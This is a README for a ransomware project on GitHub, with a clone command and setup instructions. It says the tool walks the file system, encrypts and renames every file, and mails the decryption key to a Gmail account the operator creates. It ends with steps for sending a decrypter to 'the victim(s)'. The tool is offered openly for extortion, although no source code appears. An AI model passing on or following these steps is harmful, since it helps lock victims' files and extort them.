# Ransom

## Install

    git clone https://github.com/OldKokoroz/Ransom.git


## Details

It is set to start at C: folder [ /Users or / on a Mac ]

It will go through everything in the system
  
-  If it is a directory it will add it to the directories list
  
-  If it is a file it will add it to the files list
  
-  Lastly, it will go through the directories and add files in that directory to the files list

-  Every file will be encrypted and renamed (even the extension)

  
## Get the Key

It is set to gmail by default (if you want to use proton or anything else just change the port and smtp link)

Open up a new gmail account and Enter credentials to the email, password section


## To Decrypt
- Change files and secret_key variables with the same variables you got via mail
  
- Send decrypter.py to the victim(s)
